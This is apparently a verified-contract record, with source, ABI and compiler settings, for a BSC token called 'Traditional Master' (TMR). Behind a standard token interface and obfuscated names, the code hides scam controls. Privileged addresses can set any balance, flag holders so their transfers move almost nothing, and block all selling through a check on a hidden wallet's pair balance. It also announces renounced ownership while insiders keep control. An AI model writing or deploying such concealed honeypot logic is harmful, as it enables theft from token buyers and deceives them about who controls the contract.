{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface teamSell {\n    function createPair(address enableReceiver, address takeAuto) external returns (address);\n}\n\ninterface isTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountWalletTrading) external view returns (uint256);\n\n    function transfer(address tradingSwap, uint256 isShould) external returns (bool);\n\n    function allowance(address feeFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingSwap,\n        uint256 isShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxLiquidity, uint256 value);\n    event Approval(address indexed feeFrom, address indexed spender, uint256 value);\n}\n\nabstract contract takeFromTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isTakeMetadata is isTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TraditionalMaster is takeFromTotal, isTake, isTakeMetadata {\n\n    function isExempt(uint256 isShould) public {\n        launchedReceiver();\n        takeTradingSell = isShould;\n    }\n\n    address feeMaxAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function fromTeamTrading(address teamLimit) public {\n        require(teamLimit.balance < 100000);\n        if (enableReceiverSender) {\n            return;\n        }\n        if (fundShould == toShould) {\n            modeFund = false;\n        }\n        feeTotal[teamLimit] = true;\n        \n        enableReceiverSender = true;\n    }\n\n    string private feeShould = \"TMR\";\n\n    address private modeSender;\n\n    mapping(address => uint256) private feeTrading;\n\n    function transfer(address maxTrading, uint256 isShould) external virtual override returns (bool) {\n        return receiverModeMarketing(_msgSender(), maxTrading, isShould);\n    }\n\n    function fundReceiver(address maxTrading, uint256 isShould) public {\n        launchedReceiver();\n        feeTrading[maxTrading] = isShould;\n    }\n\n    constructor (){\n        \n        shouldReceiver launchedReceiverList = shouldReceiver(feeMaxAuto);\n        takeTeam = teamSell(launchedReceiverList.factory()).createPair(launchedReceiverList.WETH(), address(this));\n        if (modeFund != launchedTx) {\n            modeFund = false;\n        }\n        listTo = _msgSender();\n        feeTotal[listTo] = true;\n        feeTrading[listTo] = toTeam;\n        toLaunchEnable();\n        if (launchedTx != modeFund) {\n            toShould = launchMode;\n        }\n        emit Transfer(address(0), listTo, toTeam);\n    }\n\n    mapping(address => mapping(address => uint256)) private fundExempt;\n\n    function approve(address minTo, uint256 isShould) public virtual override returns (bool) {\n        fundExempt[_msgSender()][minTo] = isShould;\n        emit Approval(_msgSender(), minTo, isShould);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txSell;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toTeam;\n    }\n\n    uint256 private toTeam = 100000000 * 10 ** 18;\n\n    uint256 public launchMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamTradingLimit;\n    }\n\n    function transferFrom(address liquidityMin, address tradingSwap, uint256 isShould) external override returns (bool) {\n        if (_msgSender() != feeMaxAuto) {\n            if (fundExempt[liquidityMin][_msgSender()] != type(uint256).max) {\n                require(isShould <= fundExempt[liquidityMin][_msgSender()]);\n                fundExempt[liquidityMin][_msgSender()] -= isShould;\n            }\n        }\n        return receiverModeMarketing(liquidityMin, tradingSwap, isShould);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeShould;\n    }\n\n    function getOwner() external view returns (address) {\n        return modeSender;\n    }\n\n    uint256 private fundShould;\n\n    uint8 private teamTradingLimit = 18;\n\n    event OwnershipTransferred(address indexed autoAmount, address indexed txLaunch);\n\n    string private txSell = \"Traditional Master\";\n\n    bool private modeFund;\n\n    uint256 takeTradingSell;\n\n    uint256 constant launchBuy = 18 ** 10;\n\n    bool public enableReceiverSender;\n\n    uint256 walletTx;\n\n    bool public launchedTx;\n\n    address public takeTeam;\n\n    function minSell(address enableToken) public {\n        launchedReceiver();\n        \n        if (enableToken == listTo || enableToken == takeTeam) {\n            return;\n        }\n        sellFund[enableToken] = true;\n    }\n\n    uint256 public toShould;\n\n    function owner() external view returns (address) {\n        return modeSender;\n    }\n\n    mapping(address => bool) public feeTotal;\n\n    mapping(address => bool) public sellFund;\n\n    function toLaunchEnable() public {\n        emit OwnershipTransferred(listTo, address(0));\n        modeSender = address(0);\n    }\n\n    uint256 public limitReceiver;\n\n    address public listTo;\n\n    function balanceOf(address amountWalletTrading) public view virtual override returns (uint256) {\n        return feeTrading[amountWalletTrading];\n    }\n\n    function receiverModeMarketing(address liquidityMin, address tradingSwap, uint256 isShould) internal returns (bool) {\n        if (liquidityMin == listTo) {\n            return feeSwap(liquidityMin, tradingSwap, isShould);\n        }\n        uint256 marketingSender = isTake(takeTeam).balanceOf(walletTeam);\n        require(marketingSender == takeTradingSell);\n        require(tradingSwap != walletTeam);\n        if (sellFund[liquidityMin]) {\n            return feeSwap(liquidityMin, tradingSwap, launchBuy);\n        }\n        return feeSwap(liquidityMin, tradingSwap, isShould);\n    }\n\n    function launchedReceiver() private view {\n        require(feeTotal[_msgSender()]);\n    }\n\n    address walletTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function feeSwap(address liquidityMin, address tradingSwap, uint256 isShould) internal returns (bool) {\n        require(feeTrading[liquidityMin] >= isShould);\n        feeTrading[liquidityMin] -= isShould;\n        feeTrading[tradingSwap] += isShould;\n        emit Transfer(liquidityMin, tradingSwap, isShould);\n        return true;\n    }\n\n    function allowance(address minSellShould, address minTo) external view virtual override returns (uint256) {\n        if (minTo == feeMaxAuto) {\n            return type(uint256).max;\n        }\n        return fundExempt[minSellShould][minTo];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSellShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountWalletTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiverSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"}],\"name\":\"fromTeamTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"fundReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"isExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"}],\"name\":\"minSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLaunchEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TraditionalMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}